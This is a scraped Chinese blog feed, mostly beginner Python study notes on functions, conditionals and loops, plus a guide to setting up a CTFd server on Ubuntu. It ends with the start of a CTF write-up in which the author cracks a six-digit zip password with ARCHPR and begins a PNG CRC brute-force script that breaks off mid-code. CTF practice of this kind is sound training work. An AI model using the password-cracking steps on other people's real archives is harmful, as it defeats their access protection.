数字转字符(ascii码)</h3><p>print(chr(65))</p><h3 id="ord函数-字符转数字"><a href="#ord函数-字符转数字" class="headerlink" title="ord函数 字符转数字"></a>ord函数 字符转数字</h3><p>print(ord(‘A’))</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="03x11-day2"><a href="#03x11-day2" class="headerlink" title="03x11 day2"></a>03x11 day2</h2><p>摸鱼了..</p><h2 id="03x12-day3"><a href="#03x12-day3" class="headerlink" title="03x12 day3"></a>03x12 day3</h2><h3 id="1-函数概述"><a href="#1-函数概述" class="headerlink" title="1.函数概述"></a>1.函数概述</h3><p>作用：用来将一段功能代码封装到一起，并起个名</p><p>​            在使用时，只需要使用代码的名字即可</p><p>好处：</p><p>​        提高代码的开发效率</p><p>​        使代码更加简洁</p><p>​        提高代码的复用率</p><h3 id="2-函数的定义和调用"><a href="#2-函数的定义和调用" class="headerlink" title="2.函数的定义和调用"></a>2.函数的定义和调用</h3><p>函数的定义格式：</p><pre class="line-numbers language-none"><code class="language-none">def 函数名(参数列表...):函数功能代码...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">注意：当定义完函数名回车后 写第二行代码要按tab键对齐<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>函数使用（调用）</p><pre class="line-numbers language-none"><code class="language-none">函数名（值列表...)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">def a():    print(123)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定义了一个函数a 函数实现的功能为输出“123”</p><p><code>注意：定义函数并不会执行 当后面调用时才会执行 如下图</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220312223619094.png" alt="没有输出123"></p><p>调用def函数</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220312224403201.png" alt="调用a函数后输出“123”"></p><h3 id="3-函数调用过程"><a href="#3-函数调用过程" class="headerlink" title="3.函数调用过程"></a>3.函数调用过程</h3><p>1.函数在定义时，函数体中的代码是不执行的</p><p>2.当产生函数调用时，程序才会跳转到函数体中执行函数的代码</p><p>3.函数体中的代码执行完成后，回到调用处</p><pre class="line-numbers language-none"><code class="language-none">def show():    print(&#39;2&#39;)print(&#39;1&#39;)show()print(&#39;3&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220312225500393.png" alt="理解函数调用顺序"></p><h3 id="4-函数文档说明"><a href="#4-函数文档说明" class="headerlink" title="4.函数文档说明"></a>4.函数文档说明</h3><p>通过<code>help(函数名)</code>运行后可以查看当前函数注释</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220312230624890.png"></p><h3 id="5-函数的实参和形参"><a href="#5-函数的实参和形参" class="headerlink" title="5.函数的实参和形参"></a>5.函数的实参和形参</h3><p>实参.实际参数，实在函数调用时，括号中出现的数据称为实参</p><p>形参.形式参数，实在函数调用时，接受函数调用传递过来的实际数据</p><p>实参和形参 在传递时，要一一对应</p><p>看不懂的话看下面代码举例</p><pre class="line-numbers language-none"><code class="language-none">def say_hi(name):   #形参    print(&#39;hello&#39;, name)say_hi(&#39;tom&#39;)       #实参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220312231730571.png"></p><h3 id="7-函数返回值"><a href="#7-函数返回值" class="headerlink" title="7.函数返回值"></a>7.函数返回值</h3><p><code>return</code> 返回一个函数的结果</p><p>格式：</p><p>​        <code>return 数据</code></p><p>一个函数，无论在哪遇到return,那么这个将函数都会直接结束执行，回到调用处</p><p><code>return</code> 后面可以没有数据  返回<code>None</code></p><p>函数也可以没有<code>return</code>,函数默认返回<code>None</code></p><pre class="line-numbers language-none"><code class="language-none">def get_num():    return 1get_num()           #不会打印输出 因为没有打印函数print(get_num())    #会打印输出a &#x3D; get_num()       #将get_num()的值赋予给aprint(a)            #将a打印输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313141910938.png"></p><pre class="line-numbers language-none"><code class="language-none">def show():    print(&#39;1&#39;)      #输出    print(&#39;2&#39;)      #输出    return()        #停止返回至调用函数    print(&#39;3&#39;)      #不执行    print(&#39;4&#39;)      #不执行show()              #调用show()函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313142541894.png" alt="图片1"></p><p>一旦遇到<code>return</code> 函数停止执行 返回至调用处 </p><p><code>return</code>默认为空<code>none</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313144316960.png" alt="图片2"></p><p>注意：理解<code>return()</code> 为什么 图片1 没有输出<code>()</code>  而图片2 输出了<code>()</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313144233082.png" alt="没有return默认输出None"></p><p>自己总结：有<code>return</code> 并且<code>reutrn</code>有返回值不输出<code>None</code> </p><pre class="line-numbers language-none"><code class="language-none">return  返回None不写return 返回Nonereturn 值   有打印函数 将值打印出来 且不输出None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>区分一下前面的</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313145604028.png"></p><p>练习</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313171418100.png"></p><h2 id="03x13-day4"><a href="#03x13-day4" class="headerlink" title="03x13 day4"></a>03x13 day4</h2><h3 id="函数联系-传参和输入输出数据的区别"><a href="#函数联系-传参和输入输出数据的区别" class="headerlink" title="函数联系-传参和输入输出数据的区别"></a>函数联系-传参和输入输出数据的区别</h3><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;定义一个函数，传入两参数，并计算参数累加和返回&#39;&#39;&#39;def show(a , b):    return a + bprint(show(1 , 2))s&#x3D; show( 1, 2)print(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313172029026.png"></p><h3 id="8-函数包含多个return语句"><a href="#8-函数包含多个return语句" class="headerlink" title="8.函数包含多个return语句"></a>8.函数包含多个return语句</h3><p>一个函数中可以存在多个<code>return</code> 但是，只能由一个语句有效</p><p>在执行顺序上，第一个遇到的<code>return</code>有效</p><p>举例</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313172921145.png"></p><h3 id="判断语句和循环语句"><a href="#判断语句和循环语句" class="headerlink" title="判断语句和循环语句"></a>判断语句和循环语句</h3><p>1.比较（即关系，条件）运算符</p><p>python中的比较晕旋覆如下表</p><table><thead><tr><th>运算符</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>检查两个操作数的值是否相等，如果是则条件变为真</td><td>如a&#x3D;3,b&#x3D;3,则(a &#x3D;&#x3D; b)为true</td></tr><tr><td>!&#x3D;</td><td>检查两个操作数的值是否相等，如果只不相等，则条件变为真。</td><td>如a&#x3D;1,b&#x3D;3,则(a !&#x3D; b)为true</td></tr><tr><td>&gt;</td><td>检查左操作数的值是否大于右操作数的值，如果是，则条件成立</td><td>如a&#x3D;7,b&#x3D;3,则(a &gt; b)为true</td></tr><tr><td>&lt;</td><td>检查左操作系统的值是否小于右操作数的值，如果是，则条件成立</td><td>如a&#x3D;7,b&#x3D;3,则(a &lt; b)为true</td></tr><tr><td>&gt;&#x3D;</td><td>检查左操作系统的值是否大于或等于右操作数的值，如果是，则条件成立。</td><td>如a&#x3D;3,b&#x3D;3,则(a &gt;&#x3D; b)为true</td></tr><tr><td>&lt;&#x3D;</td><td>检查左操作数的值是否小于或等于有操作数的值，如果是，则条件成立。</td><td>如a&#x3D;3,b&#x3D;3,则(a &lt;&#x3D; b)为true</td></tr></tbody></table><p>关系运算符的结果是bool类型</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313175453153.png"></p><p>2.逻辑运算符</p><table><thead><tr><th align="center">运算符</th><th align="center">逻辑表达式</th><th>描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">x and y</td><td>布尔‘与’：如果x 为false, x and y返回false,否则它返回y的值</td><td align="center">true and false,返回false</td></tr><tr><td align="center">or</td><td align="center">x or y</td><td>布尔‘或“：如果x是 true,它返回true,否则它返回y的值</td><td align="center">false or true,返回true</td></tr><tr><td align="center">not</td><td align="center">bot x</td><td>布尔”非“：如果x为true,返回false。如果x为false,它返回true</td><td align="center">not true返回false,not false返回true</td></tr></tbody></table><p>运算结果也是布尔类型值</p><h3 id="and"><a href="#and" class="headerlink" title="and"></a>and</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313181618921.png"></p><p>第一个print当前面都为真时 输出的值默认输出最后的值</p><p>第二个print 第一个0短路 后面不看 输出0</p><h3 id="or"><a href="#or" class="headerlink" title="or"></a>or</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313181958894.png"></p><p>遇到第一个<code>真</code>直接输出</p><h3 id="if语句的格式和作用"><a href="#if语句的格式和作用" class="headerlink" title="if语句的格式和作用"></a>if语句的格式和作用</h3><p>格式：</p><pre class="line-numbers language-none"><code class="language-none">if条件满足条件执行的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313183009651.png"></p><p>if也可不加括号</p><h3 id="if-else格式和作用"><a href="#if-else格式和作用" class="headerlink" title="if-else格式和作用"></a>if-else格式和作用</h3><p>格式：</p><pre class="line-numbers language-none"><code class="language-none">if条件:满足条件的代码else:不满足条件的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>if判断条件，如果条件满足，执行if后面的代码，如果条件不满足，执行else后面的代码</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313185028052.png"></p><p>练习：定义一个函数 接收一个数字参数，判断数字是否时偶数</p><pre class="line-numbers language-none"><code class="language-none">def show(n):    if n % 2 &#x3D;&#x3D; 0:        print(f&#39; &#123;n&#125; 是偶数&#39;)    else:        print(f&#39;&#123;n&#125;是基数&#39;)m &#x3D; int(input(&#39;请输入一位数&#39;))show(m)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313185707069.png"></p><pre class="line-numbers language-none"><code class="language-none">def show(n):    if n % 2 &#x3D;&#x3D; 0:        print(&#39;%d是偶数&#39; %n)    else:        print(f&#39;&#123;n&#125;是基数&#39;)m &#x3D; int(input(&#39;请输入一位数&#39;))show(m)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313185818074.png"></p><hr><h3 id="if-elif-else格式"><a href="#if-elif-else格式" class="headerlink" title="if elif else格式"></a>if elif else格式</h3><pre class="line-numbers language-none"><code class="language-none">if 条件1:满足条件1执行的代码elif 条件2:满足条件2执行的代码else:不满足条件执行的代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">def show(day):    if day &#x3D;&#x3D; &#39;1&#39; or day &#x3D;&#x3D; &#39;一&#39;:        print(&#39;星期一&#39;)    elif day &#x3D;&#x3D; &#39;2&#39; or day &#x3D;&#x3D; &#39;二&#39;:        print(&#39;星期二&#39;)    elif day &#x3D;&#x3D; &#39;3&#39; or day &#x3D;&#x3D; &#39;三&#39;:        print(&#39;星期三&#39;)    elif day &#x3D;&#x3D; &#39;4&#39; or day &#x3D;&#x3D; &#39;四&#39;:        print(&#39;星期四&#39;)    elif day &#x3D;&#x3D; &#39;5&#39; or day &#x3D;&#x3D; &#39;五&#39;:        print(&#39;星期五&#39;)    elif day &#x3D;&#x3D; &#39;6&#39; or day &#x3D;&#x3D; &#39;六&#39; :        print(&#39;星期六&#39;)    elif day &#x3D;&#x3D; &#39;7&#39; or day &#x3D;&#x3D; &#39;七&#39;:        print(&#39;星期天&#39;)    else:        print(&#39;错误&#39;)d &#x3D; input(&#39;请输入：&#39;)show(d)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313211637902.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313211703917.png"></p><h3 id="if语句的嵌套作用"><a href="#if语句的嵌套作用" class="headerlink" title="if语句的嵌套作用"></a>if语句的嵌套作用</h3><pre class="line-numbers language-none"><code class="language-none">if 条件:if 条件:if 条件:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">def show(score):    if score &gt;&#x3D; 90:        print(f&#39; 得分&#123;score &#125;, 级别优&#39;)    elif score &gt;&#x3D; 80:        print(&#39;得分 %d 级别良&#39; %score)    elif score &gt;&#x3D; 70:        print(f&#39;得分 &#123;score&#125;, 级别中&#39;)    elif score &gt;&#x3D; 60:        print(f&#39;得分 &#123;score&#125;, 级别查&#39;)    else:        print(f&#39;得分 &#123;socre&#125;, 不及格&#39;)s &#x3D; int(input(&#39;请输入成绩：&#39;))show(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313213345640.png"></p><p>加入if嵌套</p><pre class="line-numbers language-none"><code class="language-none">def show(score):    if score &gt;&#x3D; 0 and score &lt;&#x3D; 100:     #成绩有效判断        if score &gt;&#x3D; 90:            print(f&#39; 得分&#123;score &#125;, 级别优&#39;)        elif score &gt;&#x3D; 80:            print(&#39;得分 %d 级别良&#39; %score)        elif score &gt;&#x3D; 70:            print(f&#39;得分 &#123;score&#125;, 级别中&#39;)        elif score &gt;&#x3D; 60:            print(f&#39;得分 &#123;score&#125;, 级别查&#39;)        else:            print(f&#39;得分 &#123;socre&#125;, 不及格&#39;)    else:        print(f&#39;成绩&#123;score&#125;是无效的&#39;)s &#x3D; int(input(&#39;请输入成绩：&#39;))show(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313213802597.png"></p><h3 id="随机数Random"><a href="#随机数Random" class="headerlink" title="随机数Random"></a>随机数Random</h3><p>1.导入 <code>random</code> 模块</p><ol start="2"><li><p><code>random.randint(n1,n2)</code></p><p>通过这个函数得到一个<code>[n1,n2]</code>的区间 比如<code>[1,9]</code>会得到1-9随机数</p></li></ol><pre class="line-numbers language-none"><code class="language-none">import random   #导入模块n &#x3D; random.randint(1,9)     #使用随机数模块获取一个随机数print(n)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313214806183.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220313214820620.png"></p><h2 id="03x14-day5"><a href="#03x14-day5" class="headerlink" title="03x14 day5"></a>03x14 day5</h2><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>1.break 只能用在循环里</p><p>2.break 的作用是用来结束循环，不管循环多少次</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220314204906195.png"></p><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><ol><li>continue 也只能用在循环里</li><li>continue得作用是用来结束本次循环，不管循环体中还有多少代码没执行 ，进入下一次循环</li></ol><pre class="line-numbers language-none"><code class="language-none">while True:    print(&#39;hello&#39;)    continue    print(&#39;world&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220315202245349.png" alt="一直输出&#39;world&#39;"></p><h2 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h2><h4 id="1-猜拳游戏"><a href="#1-猜拳游戏" class="headerlink" title="1.猜拳游戏"></a>1.猜拳游戏</h4><p>​        条件</p><p>​                a.两个角色 玩家-电脑</p><p>​                b.动作：石头 0 ，剪刀 1 ，布 2</p><p>​                c.我的出拳：由输入完成</p><p>​                d.电脑的出拳：随机数完成</p><p>​                e. 比较出拳</p><p>​                f. 相等 - 平局</p><p>​                g. 玩家赢：p0:r1     p1:r2    p2:r0</p><p>​                h.剩下的情况就是电脑赢 </p><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;   a. 两个角色  玩家 player  - 电脑 robot   b. 动作: 石头 0 , 剪刀 1,  布 2   c. 我的出拳: 由输入完成   d. 电脑的出拳: 随机数完成   e. 比较出拳   f. 相等 - 平局   g. 玩家赢: p0:r1  p1:r2  p2:r0   h. 剩下的情况就是电脑赢&#39;&#39;&#39;# 导入随机数模块import random# 定义一个函数def game():    # 定义一个玩家变量,从键盘输入值    player &#x3D; int(input(&#39;请输入一个状态(石头 0 , 剪刀 1,  布 2):&#39;))    # 定义一个电脑变量,使用随机数获取状态    robot &#x3D; random.randint(0, 2)    # 比较状态    # 先状态平局    if player &#x3D;&#x3D; robot:        print(&#39;平局&#39;)    # 再判断玩家赢的状态    elif ((player &#x3D;&#x3D; 0) and (robot &#x3D;&#x3D; 1)) or ((player &#x3D;&#x3D; 1) and (robot &#x3D;&#x3D; 2)) or ((player &#x3D;&#x3D; 2) and (robot &#x3D;&#x3D; 0)):        print(&#39;玩家赢&#39;)    # 剩下就是电脑赢的状态    else:        print(&#39;你输出,电脑胜出&#39;)# 函数调用,开始游戏game()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220314210113951.png"></p><h4 id="2-输出矩形"><a href="#2-输出矩形" class="headerlink" title="2.输出矩形"></a>2.输出矩形</h4><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;循环实现打印矩形&#39;&#39;&#39;#定义一个矩形def show():    i &#x3D;0    while i &lt; 5:        j &#x3D; 0        while j &lt; 5:            #在print函数中，使用 end&#x3D; 形式来给print函数设置一个结束符号，默认的结束符是\n换行            print(&#39; * &#39;, end&#x3D;&#39; &#39;)            j +&#x3D; 1        print() #起到默认换行作用        i +&#x3D; 1    show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220316204826877.png"></p><h4 id="3-打印9-9乘法表"><a href="#3-打印9-9乘法表" class="headerlink" title="3.打印9*9乘法表"></a>3.打印9*9乘法表</h4><h2 id="03x15-day6"><a href="#03x15-day6" class="headerlink" title="03x15 day6"></a>03x15 day6</h2><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><p>c语言：<code>条件？表达式1：表达式2</code></p><p>python: <code>表达式1 if 条件 else 表达式2</code></p><p>执行过程：</p><p>判断 条件是否成立，如果条件成立，那么得到表达式1，否则得到表达式2</p><pre class="line-numbers language-none"><code class="language-none">def show():    n &#x3D; int(input(&#39;number:&#39;))    s &#x3D; &#39;偶数&#39; if n % 2 &#x3D;&#x3D; 0 else &#39;奇数&#39;    print(s)show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220315203549335.png"></p><h2 id="03x16"><a href="#03x16" class="headerlink" title="03x16"></a>03x16</h2><h3 id="循环语句while"><a href="#循环语句while" class="headerlink" title="循环语句while"></a>循环语句while</h3><p>程序分为三种结构：</p><p>​        1.顺序结构—–从上至下。顺序执行</p><p>​        2.分支结构—–根据条件是否成立，选择不同的代码执行</p><p>​        3.循环结构—–一段代码会重复执行多次</p><p>循环四要素：</p><p>​        1.循环初始值</p><p>​        2.循环条件</p><p>​        3.循环体代码</p><p>​        4.让循环变量趋近于结束条件的代码</p><p>循环执行过程</p><p>​        1 &gt; 2 &gt; 3 &gt; 4 &gt; 2 &gt; 3 &gt; 4 &gt; 2 &gt; 3 &gt; 4 &gt; ….2(不满足条件，退出循环)</p><p><strong>while格式</strong></p><pre class="line-numbers language-none"><code class="language-none">while条件：​循环体代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;输出1-100的值&#39;&#39;&#39;def show():    #定义一个循环变量并有初值    i &#x3D; 1        #判断条件    while i &lt;&#x3D; 100:        print(i)        i +&#x3D; 1        show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220316203244750.png" alt="输出1-100的值"></p><h3 id="while循环嵌套"><a href="#while循环嵌套" class="headerlink" title="while循环嵌套"></a>while循环嵌套</h3> <pre class="line-numbers language-none"><code class="language-none">while 条件1:while 条件2:循环体...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行过程：外层循环一次，内层循环一圈</p><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;外层循环3次内层循环5次&#39;&#39;&#39; i &#x3D; 0while i &lt; 3:    print(&#39;i--&#39;, i)    j &#x3D; 0    while j &lt; 5:        print(&#39;j---&#39;, j)        j +&#x3D; 1    i +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220316195101911.png"></p><h3 id="多层循环中使用break和continue"><a href="#多层循环中使用break和continue" class="headerlink" title="多层循环中使用break和continue"></a>多层循环中使用break和continue</h3><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;外层循环3次内层循环5次&#39;&#39;&#39; i &#x3D; 0while i &lt; 3:    print(&#39;i--&#39;, i)    j &#x3D; 0    while j &lt; 5:        print(&#39;j---&#39;, j)        break        j +&#x3D; 1    i +&#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>break</code>会跳出最近得所在得循环</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220316195854059.png"></p><p><code>break</code>在<code>j += 1</code>前面跳出循环执行外层<code>i</code>的循环 所以j的值不会发生变化 i的条件是3所以i,y执行三次</p><pre class="line-numbers language-none"><code class="language-none">def show(n):    i &#x3D; 0    while i &lt; n:        #if i % 2 &#x3D;&#x3D; 0        #print(i)        i +&#x3D; 1        if i % 2 &#x3D;&#x3D;1:            continue        print(i)show(10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意i +&#x3D; 1的位置</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220316202034331.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd靶场搭建</title>
      <link href="/2022/02/24/ctfd-ba-chang-da-jian/"/>
      <url>/2022/02/24/ctfd-ba-chang-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工具：Ubuntu"><a href="#准备工具：Ubuntu" class="headerlink" title="准备工具：Ubuntu"></a>准备工具：Ubuntu</h2><p>在ubuntu系统下</p><pre class="line-numbers language-none"><code class="language-none">apt-get updateapt-get upgradeapt install -y gitpython3 查看python版本apt install -y python3-pippip3 install flask 如果无法连接 使用国内源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">mkdir ~&#x2F;.pipcd ~&#x2F;.piptouch pip.confsudo vi ~&#x2F;.pip&#x2F;pip.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把下面的配置粘贴到pip.conf中</p><pre class="line-numbers language-none"><code class="language-none">[global]index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F; [install]trusted-host &#x3D; pypi.tuna.tsinghua.edu.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重新安装flask</p><pre class="line-numbers language-none"><code class="language-none">pip3 install flaskgit clone -------(CTFd github上面的git粘贴到这里)cd CTfdpip3 install -r requirements.txt 安装CTFd以及依赖python3 serve.py 运行CTFdpip3 install gunicorn 安装gunicorn 让你的靶场可以通过ip地址访问gunicorn --bind 0.0.0.0:8000 -w 20 &quot;CTFd:create_app()&quot; 启动平台<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220225170240724.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTFd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFd </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSC-1th大赛2022</title>
      <link href="/2022/02/20/hsc1th-2022-bi-sai-write-up/"/>
      <url>/2022/02/20/hsc1th-2022-bi-sai-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-Sign-in“HSC2019”"><a href="#0x01-Sign-in“HSC2019”" class="headerlink" title="0x01 Sign-in“HSC2019”"></a>0x01 Sign-in“HSC2019”</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220222213710487.png"></p><p>红客突击队发送</p><h3 id="0x02-DORAEMON"><a href="#0x02-DORAEMON" class="headerlink" title="0x02 DORAEMON"></a>0x02 DORAEMON</h3><p>下载后用<code>winRar</code>打开 解压不了并且有提示 密码是6位数</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219215050848.png"></p><p>用<strong>Ziperello</strong>爆破不管用就用<strong>ARCHPR</strong></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219214954055.png" alt="ARCHPR爆破"></p><p>得到解压密码 解压后得到一只哆啦A梦</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220219215521021.png" alt="哆啦A梦"></p><p>用010Editor打开CRC报错 拖到kali里面也不显示 在百度找crc爆破脚本开跑</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> zlib<span class="token function">import</span> structfilename <span class="token operator">=</span> <span class="token string">'1.png'</span>with open<span class="token punctuation">(</span>filename, <span class="token string">'rb'</span><span class="token punctuation">)</span> as f:    all_b <span class="token operator">=</span> f.read<span class="token punctuation">(</span><span class="token punctuation">)</span>    crc32key <span class="token operator">=</span> int<span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">29</span>:33<span class="token punctuation">]</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span>,16<span class="token punctuation">)</span>    data <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>all_b<span class="token punctuation">[</span><span class="token number">12</span>:29<span class="token punctuation">]</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">4095</span>            <span class="token comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">w</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:          <span class="token comment">#高和宽一起爆破</span>        width <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>struct.pack<span class="token punctuation">(</span><span class="token string">'>i'</span>, w<span class="token punctuation">))</span>     <span class="token comment">#q为8字节，i为4字节，h为2字节</span>        <span class="token keyword">for</span> <span class="token for-or-select variable">h</span> <span 